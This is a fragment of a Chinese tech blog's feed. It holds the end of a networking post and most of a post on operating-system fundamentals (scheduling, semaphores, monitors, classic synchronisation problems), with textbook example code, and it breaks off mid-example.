style="text-align:center"></td></tr><tr><td style="text-align:center">超文本传送协议</td><td style="text-align:center">HTTP</td><td style="text-align:center">80</td><td style="text-align:center">TCP</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">简单邮件传送协议</td><td style="text-align:center">SMTP</td><td style="text-align:center">25</td><td style="text-align:center">TCP</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">邮件读取协议</td><td style="text-align:center">POP3</td><td style="text-align:center">110</td><td style="text-align:center">TCP</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">网际报文存取协议</td><td style="text-align:center">IMAP</td><td style="text-align:center">143</td><td style="text-align:center">TCP</td></tr></tbody></table><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li>计算机网络, 谢希仁</li><li>JamesF.Kurose, KeithW.Ross, 库罗斯, 等. 计算机网络: 自顶向下方法 [M]. 机械工业出版社, 2014.</li><li><a href="http://www.climatechangenews.com/2011/html/university-tokyo.html" target="_blank" rel="noopener">Tackling emissions targets in Tokyo</a></li><li><a href="http://www.climatechangenews.com/2011/html/university-tokyo.html" target="_blank" rel="noopener">What does my ISP know when I use Tor?</a></li><li><a href="http://www.linyibin.cn/2017/02/12/technology-ComputerNetworking-Internet/" target="_blank" rel="noopener">Technology-Computer Networking[1]-Computer Networks and the Internet</a></li><li><a href="http://slidesplayer.com/slide/11616167/" target="_blank" rel="noopener">P2P 网络概述.</a></li><li><a href="http://slideplayer.com/slide/5115386/" target="_blank" rel="noopener">Circuit Switching (a) Circuit switching. (b) Packet switching.</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- GFM-TOC --&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#一概述&quot;&gt;一、概述&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#网络的网络&quot;&gt;网络的网络&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#isp&quot;&gt;ISP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#主机之间
      
    
    </summary>
    
      <category term="系统运维" scheme="https://linux7788.com/categories/%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/"/>
    
      <category term="Network" scheme="https://linux7788.com/categories/%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/Network/"/>
    
    
      <category term="ops" scheme="https://linux7788.com/tags/ops/"/>
    
  </entry>
  
  <entry>
    <title>计算机操作系统基础知识</title>
    <link href="https://linux7788.com/linux_ops/computer-operating-system/"/>
    <id>https://linux7788.com/linux_ops/computer-operating-system/</id>
    <published>2018-05-18T12:38:25.000Z</published>
    <updated>2018-05-18T15:32:58.988Z</updated>
    
    <content type="html"><![CDATA[<!-- GFM-TOC --><ul><li><a href="#一概述">一、概述</a><ul><li><a href="#操作系统基本特征">操作系统基本特征</a></li><li><a href="#操作系统基本功能">操作系统基本功能</a></li><li><a href="#系统调用">系统调用</a></li><li><a href="#大内核和微内核">大内核和微内核</a></li><li><a href="#中断分类">中断分类</a></li></ul></li><li><a href="#二进程管理">二、进程管理</a><ul><li><a href="#进程与线程">进程与线程</a></li><li><a href="#进程状态的切换">进程状态的切换</a></li><li><a href="#调度算法">调度算法</a></li><li><a href="#进程同步">进程同步</a></li><li><a href="#经典同步问题">经典同步问题</a></li><li><a href="#进程通信">进程通信</a></li></ul></li><li><a href="#三死锁">三、死锁</a><ul><li><a href="#死锁的必要条件">死锁的必要条件</a></li><li><a href="#死锁的处理方法">死锁的处理方法</a></li></ul></li><li><a href="#四内存管理">四、内存管理</a><ul><li><a href="#虚拟内存">虚拟内存</a></li><li><a href="#分页与分段">分页与分段</a></li><li><a href="#分页系统地址映射">分页系统地址映射</a></li><li><a href="#页面置换算法">页面置换算法</a></li></ul></li><li><a href="#五设备管理">五、设备管理</a><ul><li><a href="#磁盘调度算法">磁盘调度算法</a></li></ul></li><li><a href="#六链接">六、链接</a><ul><li><a href="#编译系统">编译系统</a></li><li><a href="#目标文件">目标文件</a></li><li><a href="#静态链接">静态链接</a></li><li><a href="#动态链接">动态链接</a></li></ul></li><li><a href="#参考资料">参考资料</a><!-- GFM-TOC --></li></ul><h1 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h1><h2 id="操作系统基本特征"><a href="#操作系统基本特征" class="headerlink" title="操作系统基本特征"></a>操作系统基本特征</h2><h3 id="1-并发"><a href="#1-并发" class="headerlink" title="1. 并发"></a>1. 并发</h3><p>并发是指宏观上在一段时间内能同时运行多个程序，而并行则指同一时刻能运行多个指令。</p><p>并行需要硬件支持，如多流水线或者多处理器。</p><p>操作系统通过引入进程和线程，使得程序能够并发运行。</p><h3 id="2-共享"><a href="#2-共享" class="headerlink" title="2. 共享"></a>2. 共享</h3><p>共享是指系统中的资源可以被多个并发进程共同使用。</p><p>有两种共享方式：互斥共享和同时共享。</p><p>互斥共享的资源称为临界资源，例如打印机等，在同一时间只允许一个进程访问，需要用同步机制来实现对临界资源的访问。</p><h3 id="3-虚拟"><a href="#3-虚拟" class="headerlink" title="3. 虚拟"></a>3. 虚拟</h3><p>虚拟技术把一个物理实体转换为多个逻辑实体。</p><p>主要有两种虚拟技术：时分复用技术和空分复用技术。例如多个进程能在同一个处理器上并发执行使用了时分复用技术，让每个进程轮流占有处理器，每次只执行一小个时间片并快速切换。</p><h3 id="4-异步"><a href="#4-异步" class="headerlink" title="4. 异步"></a>4. 异步</h3><p>异步指进程不是一次性执行完毕，而是走走停停，以不可知的速度向前推进。</p><h2 id="操作系统基本功能"><a href="#操作系统基本功能" class="headerlink" title="操作系统基本功能"></a>操作系统基本功能</h2><h3 id="1-进程管理"><a href="#1-进程管理" class="headerlink" title="1. 进程管理"></a>1. 进程管理</h3><p>进程控制、进程同步、进程通信、死锁处理、处理机调度等。</p><h3 id="2-内存管理"><a href="#2-内存管理" class="headerlink" title="2. 内存管理"></a>2. 内存管理</h3><p>内存分配、地址映射、内存保护与共享、内存扩充等。</p><h3 id="3-文件管理"><a href="#3-文件管理" class="headerlink" title="3. 文件管理"></a>3. 文件管理</h3><p>文件存储空间的管理、目录管理、文件读写管理和保护等。</p><h3 id="4-设备管理"><a href="#4-设备管理" class="headerlink" title="4. 设备管理"></a>4. 设备管理</h3><p>完成用户的 I/O 请求，方便用户使用各种设备，并提高设备的利用率。</p><p>主要包括缓冲管理、设备分配、设备处理、虛拟设备等。</p><h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><p>如果一个进程在用户态需要使用内核态的功能，就进行系统调用从而陷入内核，由操作系统代为完成。</p><p><div align="center"> <img src="/images/posts/tGPV0.png" width="600"> </div><br></p><p>Linux 的系统调用主要有以下这些：</p><table><thead><tr><th style="text-align:center">Task</th><th>Commands</th></tr></thead><tbody><tr><td style="text-align:center">进程控制</td><td>fork(); exit(); wait();</td></tr><tr><td style="text-align:center">进程通信</td><td>pipe(); shmget(); mmap();</td></tr><tr><td style="text-align:center">文件操作</td><td>open(); read(); write();</td></tr><tr><td style="text-align:center">设备操作</td><td>ioctl(); read(); write();</td></tr><tr><td style="text-align:center">信息维护</td><td>getpid(); alarm(); sleep();</td></tr><tr><td style="text-align:center">安全</td><td>chmod(); umask(); chown();</td></tr></tbody></table><h2 id="大内核和微内核"><a href="#大内核和微内核" class="headerlink" title="大内核和微内核"></a>大内核和微内核</h2><h3 id="1-大内核"><a href="#1-大内核" class="headerlink" title="1. 大内核"></a>1. 大内核</h3><p>大内核是将操作系统功能作为一个紧密结合的整体放到内核。</p><p>由于各模块共享信息，因此有很高的性能。</p><h3 id="2-微内核"><a href="#2-微内核" class="headerlink" title="2. 微内核"></a>2. 微内核</h3><p>由于操作系统不断复杂，因此将一部分操作系统功能移出内核，从而降低内核的复杂性。移出的部分根据分层的原则划分成若干服务，相互独立。</p><p>在微内核结构下，操作系统被划分成小的、定义良好的模块，只有微内核这一个模块运行在内核态，其余模块运行在用户态。</p><p>因为需要频繁地在用户态和核心态之间进行切换，所以会有一定的性能损失。</p><p><div align="center"> <img src="/images/posts/2_14_microkernelArchitecture.jpg"> </div><br></p><h2 id="中断分类"><a href="#中断分类" class="headerlink" title="中断分类"></a>中断分类</h2><h3 id="1-外中断"><a href="#1-外中断" class="headerlink" title="1. 外中断"></a>1. 外中断</h3><p>由 CPU 执行指令以外的事件引起，如 I/O 结束中断，表示设备输入/输出处理已经完成，处理器能够发送下一个输入/输出请求。此外还有时钟中断、控制台中断等。</p><h3 id="2-异常"><a href="#2-异常" class="headerlink" title="2. 异常"></a>2. 异常</h3><p>由 CPU 执行指令的内部事件引起，如非法操作码、地址越界、算术溢出等。</p><h3 id="3-陷入"><a href="#3-陷入" class="headerlink" title="3. 陷入"></a>3. 陷入</h3><p>在用户程序中使用系统调用。</p><h1 id="二、进程管理"><a href="#二、进程管理" class="headerlink" title="二、进程管理"></a>二、进程管理</h1><h2 id="进程与线程"><a href="#进程与线程" class="headerlink" title="进程与线程"></a>进程与线程</h2><h3 id="1-进程"><a href="#1-进程" class="headerlink" title="1. 进程"></a>1. 进程</h3><p>进程是资源分配的基本单位。</p><p>进程控制块 (Process Control Block, PCB) 描述进程的基本信息和运行状态，所谓的创建进程和撤销进程，都是指对 PCB 的操作。</p><p>下图显示了 4 个程序创建了 4 个进程，这 4 个进程可以并发地执行。</p><p><div align="center"> <img src="/images/posts/a6ac2b08-3861-4e85-baa8-382287bfee9f.png"> </div><br></p><h3 id="2-线程"><a href="#2-线程" class="headerlink" title="2. 线程"></a>2. 线程</h3><p>线程是独立调度的基本单位。</p><p>一个进程中可以有多个线程，它们共享进程资源。</p><p><div align="center"> <img src="/images/posts/3cd630ea-017c-488d-ad1d-732b4efeddf5.png"> </div><br></p><h3 id="3-区别"><a href="#3-区别" class="headerlink" title="3. 区别"></a>3. 区别</h3><ul><li><p>拥有资源：进程是资源分配的基本单位，但是线程不拥有资源，线程可以访问隶属进程的资源。</p></li><li><p>调度：线程是独立调度的基本单位，在同一进程中，线程的切换不会引起进程切换，从一个进程内的线程切换到另一个进程中的线程时，会引起进程切换。</p></li><li><p>系统开销：由于创建或撤销进程时，系统都要为之分配或回收资源，如内存空间、I/O 设备等，所付出的开销远大于创建或撤销线程时的开销。类似地，在进行进程切换时，涉及当前执行进程 CPU 环境的保存及新调度进程 CPU 环境的设置，而线程切换时只需保存和设置少量寄存器内容，开销很小。</p></li><li><p>通信方面：进程间通信 (IPC) 需要进程同步和互斥手段的辅助，以保证数据的一致性。而线程间可以通过直接读/写同一进程中的数据段（如全局变量）来进行通信。</p></li></ul><p>举例：QQ 和浏览器是两个进程，浏览器进程里面有很多线程，例如 HTTP 请求线程、事件响应线程、渲染线程等等，线程的并发执行使得在浏览器中点击一个新链接从而发起 HTTP 请求时，浏览器还可以响应用户的其它事件。</p><h2 id="进程状态的切换"><a href="#进程状态的切换" class="headerlink" title="进程状态的切换"></a>进程状态的切换</h2><p><div align="center"> <img src="/images/posts/ProcessState.png" width="500"> </div><br></p><ul><li>就绪状态（ready）：等待被调度</li><li>运行状态（running）</li><li>阻塞状态（waiting）：等待资源</li></ul><p>应该注意以下内容：</p><ul><li>只有就绪态和运行态可以相互转换，其它的都是单向转换。就绪状态的进程通过调度算法从而获得 CPU 时间，转为运行状态；而运行状态的进程，在分配给它的 CPU 时间片用完之后就会转为就绪状态，等待下一次调度。</li><li>阻塞状态是缺少需要的资源从而由运行状态转换而来，但是该资源不包括 CPU 时间，缺少 CPU 时间会从运行态转换为就绪态。</li></ul><h2 id="调度算法"><a href="#调度算法" class="headerlink" title="调度算法"></a>调度算法</h2><p>需要针对不同环境来讨论调度算法。</p><h3 id="1-批处理系统中的调度"><a href="#1-批处理系统中的调度" class="headerlink" title="1. 批处理系统中的调度"></a>1. 批处理系统中的调度</h3><h4 id="1-1-先来先服务"><a href="#1-1-先来先服务" class="headerlink" title="1.1 先来先服务"></a>1.1 先来先服务</h4><blockquote><p>first-come first-serverd（FCFS）</p></blockquote><p>调度最先进入就绪队列的作业。</p><p>有利于长作业，但不利于短作业，因为短作业必须一直等待前面的长作业执行完毕才能执行，而长作业又需要执行很长时间，造成了短作业等待时间过长。</p><h4 id="1-2-短作业优先"><a href="#1-2-短作业优先" class="headerlink" title="1.2 短作业优先"></a>1.2 短作业优先</h4><blockquote><p>shortest job first（SJF）</p></blockquote><p>调度估计运行时间最短的作业。</p><p>长作业有可能会饿死，处于一直等待短作业执行完毕的状态。因为如果一直有短作业到来，那么长作业永远得不到调度。</p><h4 id="1-3-最短剩余时间优先"><a href="#1-3-最短剩余时间优先" class="headerlink" title="1.3 最短剩余时间优先"></a>1.3 最短剩余时间优先</h4><blockquote><p>shortest remaining time next（SRTN）</p></blockquote><h3 id="2-交互式系统中的调度"><a href="#2-交互式系统中的调度" class="headerlink" title="2. 交互式系统中的调度"></a>2. 交互式系统中的调度</h3><h4 id="2-1-优先级调度"><a href="#2-1-优先级调度" class="headerlink" title="2.1 优先级调度"></a>2.1 优先级调度</h4><p>除了可以手动赋予优先权之外，还可以把响应比作为优先权，这种调度方式叫做高响应比优先调度算法。</p><p>响应比 = (等待时间 + 要求服务时间) / 要求服务时间 = 响应时间 / 要求服务时间</p><p>这种调度算法主要是为了解决短作业优先调度算法长作业可能会饿死的问题，因为随着等待时间的增长，响应比也会越来越高。</p><h4 id="2-2-时间片轮转"><a href="#2-2-时间片轮转" class="headerlink" title="2.2 时间片轮转"></a>2.2 时间片轮转</h4><p>将所有就绪进程按 FCFS 的原则排成一个队列，每次调度时，把 CPU 时间分配给队首进程，该进程可以执行一个时间片。当时间片用完时，由计时器发出时钟中断，调度程序便停止该进程的执行，并将它送往就绪队列的末尾，同时继续把 CPU 时间分配给队首的进程。</p><p>时间片轮转算法的效率和时间片的大小有很大关系。因为进程切换都要保存进程的信息并且载入新进程的信息，如果时间片太小，会导致进程切换得太频繁，在进程切换上就会花过多时间。</p><h4 id="2-3-多级反馈队列"><a href="#2-3-多级反馈队列" class="headerlink" title="2.3 多级反馈队列"></a>2.3 多级反馈队列</h4><p><div align="center"> <img src="/images/posts/042cf928-3c8e-4815-ae9c-f2780202c68f.png"> </div><br></p><p>如果一个进程需要执行 100 个时间片，如果采用轮转调度算法，那么需要交换 100 次。多级队列是为这种需要连续执行多个时间片的进程考虑，它设置了多个队列，每个队列时间片大小都不同，例如 1,2,4,8,..。进程在第一个队列没执行完，就会被移到下一个队列。这种方式下，之前的进程只需要交换 7 次。</p><p>每个队列优先权也不同，最上面的优先权最高。因此只有上一个队列没有进程在排队，才能调度当前队列上的进程。</p><h3 id="3-实时系统中的调度"><a href="#3-实时系统中的调度" class="headerlink" title="3. 实时系统中的调度"></a>3. 实时系统中的调度</h3><p>实时系统要求一个服务请求在一个确定时间内得到响应。</p><p>分为硬实时和软实时，前者必须满足绝对的截止时间，后者可以容忍一定的超时。</p><h2 id="进程同步"><a href="#进程同步" class="headerlink" title="进程同步"></a>进程同步</h2><h3 id="1-临界区"><a href="#1-临界区" class="headerlink" title="1. 临界区"></a>1. 临界区</h3><p>对临界资源进行访问的那段代码称为临界区。</p><p>为了互斥访问临界资源，每个进程在进入临界区之前，需要先进行检查。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// entry section</span><br><span class="line">// critical section;</span><br><span class="line">// exit section</span><br></pre></td></tr></table></figure><h3 id="2-同步与互斥"><a href="#2-同步与互斥" class="headerlink" title="2. 同步与互斥"></a>2. 同步与互斥</h3><ul><li>同步：多个进程按一定顺序执行；</li><li>互斥：多个进程在同一时刻只有一个进程能进入临界区。</li></ul><h3 id="3-信号量"><a href="#3-信号量" class="headerlink" title="3. 信号量"></a>3. 信号量</h3><p>信号量（Semaphore）是一个整型变量，可以对其执行 down 和 up 操作，也就是常见的 P 和 V 操作。</p><ul><li><strong>down</strong>  : 如果信号量大于 0 ，执行 -1 操作；如果信号量等于 0，进程睡眠，等待信号量大于 0；</li><li><strong>up</strong> ：对信号量执行 +1 操作，唤醒睡眠的进程让其完成 down 操作。</li></ul><p>down 和 up 操作需要被设计成原语，不可分割，通常的做法是在执行这些操作的时候屏蔽中断。</p><p>如果信号量的取值只能为 0 或者 1，那么就成为了  <strong>互斥量（Mutex）</strong> ，0 表示临界区已经加锁，1 表示临界区解锁。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> semaphore;</span><br><span class="line">semaphore mutex = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">P1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    down(&amp;mutex);</span><br><span class="line">    <span class="comment">// 临界区</span></span><br><span class="line">    up(&amp;mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">P2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    down(&amp;mutex);</span><br><span class="line">    <span class="comment">// 临界区</span></span><br><span class="line">    up(&amp;mutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font size="3">  <strong>使用信号量实现生产者-消费者问题</strong>  </font> <br></p><p>问题描述：使用一个缓冲区来保存物品，只有缓冲区没有满，生产者才可以放入物品；只有缓冲区不为空，消费者才可以拿走物品。</p><p>因为缓冲区属于临界资源，因此需要使用一个互斥量 mutex 来控制对缓冲区的互斥访问。</p><p>为了同步生产者和消费者的行为，需要记录缓冲区中物品的数量。数量可以使用信号量来进行统计，这里需要使用两个信号量：empty 记录空缓冲区的数量，full 记录满缓冲区的数量。其中，empty 信号量是在生产者进程中使用，当 empty 不为 0 时，生产者才可以放入物品；full 信号量是在消费者进程中使用，当 full 信号量不为 0 时，消费者才可以取走物品。</p><p>注意，不能先对缓冲区进行加锁，再测试信号量。也就是说，不能先执行 down(mutex) 再执行 down(empty)。如果这么做了，那么可能会出现这种情况：生产者对缓冲区加锁后，执行 down(empty) 操作，发现 empty = 0，此时生产者睡眠。消费者不能进入临界区，因为生产者对缓冲区加锁了，也就无法执行 up(empty) 操作，empty 永远都为 0，那么生产者和消费者就会一直等待下去，造成死锁。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> semaphore;</span><br><span class="line">semaphore mutex = <span class="number">1</span>;</span><br><span class="line">semaphore empty = N;</span><br><span class="line">semaphore full = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">producer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(TRUE)&#123;</span><br><span class="line">        <span class="keyword">int</span> item = produce_item();</span><br><span class="line">        down(&amp;empty);</span><br><span class="line">        down(&amp;mutex);</span><br><span class="line">        insert_item(item);</span><br><span class="line">        up(&amp;mutex);</span><br><span class="line">        up(&amp;full);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">consumer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(TRUE)&#123;</span><br><span class="line">        down(&amp;full);</span><br><span class="line">        down(&amp;mutex);</span><br><span class="line">        <span class="keyword">int</span> item = remove_item();</span><br><span class="line">        up(&amp;mutex);</span><br><span class="line">        up(&amp;empty);</span><br><span class="line">        consume_item(item);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-管程"><a href="#4-管程" class="headerlink" title="4. 管程"></a>4. 管程</h3><p>使用信号量机制实现的生产者消费者问题需要客户端代码做很多控制，而管程把控制的代码独立出来，不仅不容易出错，也使得客户端代码调用更容易。</p><p>c 语言不支持管程，下面的示例代码使用了类 Pascal 语言来描述管程。示例代码的管程提供了 insert() 和 remove() 方法，客户端代码通过调用这两个方法来解决生产者-消费者问题。</p><figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">monitor ProducerConsumer</span><br><span class="line">    integer i;</span><br><span class="line">    condition c;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">procedure</span> <span class="title">insert</span><span class="params">()</span>;</span></span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">end</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">procedure</span> <span class="title">remove</span><span class="params">()</span>;</span></span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">end</span>;</span><br><span class="line"><span class="keyword">end</span> monitor;</span><br></pre></td></tr></table></figure><p>管程有一个重要特性：在一个时刻只能有一个进程使用管程。进程在无法继续执行的时候不能一直占用管程，否者其它进程永远不能使用管程。</p><p>管程引入了  <strong>条件变量</strong>  以及相关的操作：<strong>wait()</strong> 和 <strong>signal()</strong> 来实现同步操作。对条件变量执行 wait() 操作会导致调用进程阻塞，把管程让出来给另一个进程持有。signal() 操作用于唤醒被阻塞的进程。</p><p><font size="3"> <strong>使用管程实现生成者-消费者问题</strong> </font><br></p><figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 管程</span></span><br><span class="line">monitor ProducerConsumer</span><br><span class="line">    condition full, empty;</span><br><span class="line">    integer count := <span class="number">0</span>;</span><br><span class="line">    condition c;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">procedure</span> <span class="title">insert</span><span class="params">(item: integer)</span>;</span></span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">        <span class="keyword">if</span> count = N <span class="keyword">then</span> wait(full);</span><br><span class="line">        insert_item(item);</span><br><span class="line">        count := count + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> count = <span class="number">1</span> <span class="keyword">then</span> signal(empty);</span><br><span class="line">    <span class="keyword">end</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">remove</span>:</span> integer;</span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">        <span class="keyword">if</span> count = <span class="number">0</span> <span class="keyword">then</span> wait(empty);</span><br><span class="line">        remove = remove_item;</span><br><span class="line">        count := count - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> count = N -<span class="number">1</span> <span class="keyword">then</span> signal(full);</span><br><span class="line">    <span class="keyword">end</span>;</span><br><span class="line"><span class="keyword">end</span> monitor;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生产者客户端</span></span><br><span class="line"><span class="function"><span class="keyword">procedure</span> <span class="title">producer</span></span></span><br><span class="line"><span class="function"><span class="title">begin</span></span></span><br><span class="line"><span class="function">    <span class="title">while</span> <span class="title">true</span> <span class="title">do</span></span></span><br><span class="line"><span class="function">    <span class="title">begin</span></span></span><br><span class="line"><span class="function">        <span class="title">item</span> = <span class="title">produce_item</span>;</span></span><br><span class="line">        ProducerConsumer.insert(item);</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 消费者客户端</span></span><br><span class="line"><span class="function"><span class="keyword">procedure</span> <span class="title">consumer</span></span></span><br><span class="line"><span class="function"><span class="title">begin</span></span></span><br><span class="line"><span class="function">    <span class="title">while</span> <span class="title">true</span> <span class="title">do</span></span></span><br><span class="line"><span class="function">    <span class="title">begin</span></span></span><br><span class="line"><span class="function">        <span class="title">item</span> = <span class="title">ProducerConsumer</span>.<span class="title">remove</span>;</span></span><br><span class="line">        consume_item(item);</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span>;</span><br></pre></td></tr></table></figure><h2 id="经典同步问题"><a href="#经典同步问题" class="headerlink" title="经典同步问题"></a>经典同步问题</h2><p>生产者和消费者问题前面已经讨论过了。</p><h3 id="1-读者-写者问题"><a href="#1-读者-写者问题" class="headerlink" title="1. 读者-写者问题"></a>1. 读者-写者问题</h3><p>允许多个进程同时对数据进行读操作，但是不允许读和写以及写和写操作同时发生。</p><p>一个整型变量 count 记录在对数据进行读操作的进程数量，一个互斥量 count_mutex 用于对 count 加锁，一个互斥量 data_mutex 用于对读写的数据加锁。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> semaphore;</span><br><span class="line">semaphore count_mutex = <span class="number">1</span>;</span><br><span class="line">semaphore data_mutex = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reader</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(TRUE) &#123;</span><br><span class="line">        down(&amp;count_mutex);</span><br><span class="line">        count++;</span><br><span class="line">        <span class="keyword">if</span>(count == <span class="number">1</span>) down(&amp;data_mutex); <span class="comment">// 第一个读者需要对数据进行加锁，防止写进程访问</span></span><br><span class="line">        up(&amp;count_mutex);</span><br><span class="line">        read();</span><br><span class="line">        down(&amp;count_mutex);</span><br><span class="line">        count--;</span><br><span class="line">        <span class="keyword">if</span>(count == <span class="number">0</span>) up(&amp;data_mutex);</span><br><span class="line">        up(&amp;count_mutex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">writer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(TRUE) &#123;</span><br><span class="line">        down(&amp;data_mutex);</span><br><span class="line">        write();</span><br><span class="line">        up(&amp;data_mutex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-哲学家进餐问题"><a href="#2-哲学家进餐问题" class="headerlink" title="2. 哲学家进餐问题"></a>2. 哲学家进餐问题</h3><p><div align="center"> <img src="/images/posts/a9077f06-7584-4f2b-8c20-3a8e46928820.jpg"> </div><br></p><p>五个哲学家围着一张圆桌，每个哲学家面前放着食物。哲学家的生活有两种交替活动：吃饭以及思考。当一个哲学家吃饭时，需要先拿起自己左右两边的两根筷子，并且一次只能拿起一根筷子。</p><p>下面是一种错误的解法，考虑到如果所有哲学家同时拿起左手边的筷子，那么就无法拿起右手边的筷子，造成死锁。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 5</span></span><br><span class="line"></span><br><span class="line"><span 